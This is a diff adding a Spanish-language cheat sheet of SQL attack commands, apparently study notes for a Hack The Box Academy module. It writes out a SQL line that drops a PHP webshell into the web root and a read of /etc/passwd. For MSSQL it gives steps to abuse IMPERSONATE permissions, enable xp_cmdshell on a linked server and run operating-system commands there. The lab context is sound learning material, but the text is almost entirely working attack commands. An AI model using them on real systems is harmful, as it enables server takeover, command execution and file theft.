@@ -1,0 +1,45 @@
+Mas info en: https://academy.hackthebox.com/module/116/section/1169
+
+####SQL
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+#Escribir un archivo
+select LOAD_FILE("/etc/passwd");
+#Leer archivos
+
+###SQLSH
+Siempre se manda la query con "go"
+
+##Impersonate
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+#Como outpout me da los usr que puedo impersonar
+
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+#Verifico roles
+
+EXECUTE AS LOGIN = 'USER'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+#Impersono al usuario USER
+
+
+##Linked Server
+SELECT srvname, isremote FROM sysservers
+#Verificar por linked servers
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LINKEDSRV]
+#Se ejecuta el comando para poder ser sysadmin en el linked server que isremote dio 0 
+
+EXECUTE('EXECUTE sp_configure ''show advanced options'', 1') AT [LINKEDSRV]
+EXECUTE('RECONFIGURE') AT [LINKEDSRV]
+EXECUTE('EXECUTE sp_configure ''xp_cmdshell'', 1') AT [LINKEDSRV]
+EXECUTE('RECONFIGURE') AT [LINKEDSRV]
+EXECUTE('xp_cmdshell ''whoami''') AT [LINKEDSRV]
+#Habilitar xp_cdmshell
+
+EXECUTE('xp_cmdshell "type C:\Users\Administrator\Desktop\flag.txt"') AT [LINKEDSRV]
+#Leer archivos
+
